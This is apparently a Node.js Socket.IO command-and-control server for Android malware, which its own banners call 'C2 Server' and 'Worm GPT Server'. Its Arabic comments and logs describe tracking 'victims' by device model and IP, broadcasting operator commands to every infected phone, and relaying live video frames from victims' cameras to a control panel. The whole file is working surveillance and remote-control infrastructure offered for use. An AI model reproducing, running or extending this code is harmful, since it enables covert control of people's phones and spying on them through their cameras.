const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*", 
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8 
});

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.status(200).send('C2 Server is Online and Secure 😈');
});

let victims = {};

io.on('connection', (socket) => {
    console.log('[!] اتصال جديد عبر النفق المشفر');

    // 1. استقبال دخول الضحية
    socket.on('victim_online', (data) => {
        victims[socket.id] = {
            id: socket.id,
            model: data.model || "Unknown Android",
            ip: socket.handshake.address
        };
        console.log(`[+] تم إحكام السيطرة على: ${victims[socket.id].model}`);
        io.emit('new_victim_alert', victims[socket.id]);
    });

    // 2. توجيه الأوامر من لوحة التحكم إلى الضحية (إضافة ضرورية)
    socket.on('admin_command', (payload) => {
        // نرسل الأمر لكل الأجهزة المتصلة
        socket.broadcast.emit(payload.command, payload);
        console.log(`[→] تم إرسال أمر: ${payload.command}`);
    });

    // 3. نقل بث الفيديو من الضحية إلى لوحة التحكم (إضافة ضرورية)
    socket.on('video_frame', (frameData) => {
        socket.broadcast.emit('display_frame', { frame: frameData });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`[-] انقطع اتصال: ${victims[socket.id].model}`);
            delete victims[socket.id];
        }
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => {
    console.log(`Worm GPT Server Live on Port ${PORT}`);
});
